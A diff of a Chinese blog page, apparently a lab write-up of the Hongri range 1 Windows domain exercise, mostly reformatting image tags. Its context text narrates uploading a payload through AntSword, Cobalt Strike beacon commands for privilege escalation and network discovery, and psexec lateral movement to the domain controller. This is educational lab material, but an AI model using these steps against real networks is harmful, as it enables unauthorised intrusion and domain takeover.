-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_46.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_46.png" alt="" /></figure>
+
+
+
 然后在蚁剑上上传进去,并执行,这边很快的显示弹回来了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_47.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_47.png" alt="" /></figure>
+
+
+
 之后再beacon进行交互</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sleep <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># 进入交互模式</span>
 </span></span><span style="display:flex;"><span>getsystem <span style="color:#75715e"># 提权</span>
 </span></span><span style="display:flex;"><span>net view <span style="color:#75715e"># 查看当前网络中的其他机器</span>
 </span></span></code></pre></div><p>查看完之后再target视图中可以看到其他机器了,如果没有的话就扫描一下
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_48.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_48.png" alt="" /></figure>
+
+
+
 然后右键,选择psexec64
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_49.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_49.png" alt="" /></figure>
+
+
+
 新建一个用于psexec的监听器,然后
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_50.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_50.png" alt="" /></figure>
+
+
+
 运行之后就能拿到shell了,换成cs之后,很容易的就拿到了域控的shell
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_51.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_51.png" alt="" /></figure>
+
+
+</p>
 <p>最后以同样的方法,使用psexec32上线win2003机器
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_52.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_52.png" alt="" /></figure>
+
+
+</p>
 <h1 id="l1uyun">l1uyun</h1>
 <p>第一次打win域的机器,过段时间再打一下这台机器,这次是在学习打win域的流程了</p>
 <p>这机器拖了好久才弄完&hellip;</p>
@@ -747,7 +1007,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 85391 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 85604 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
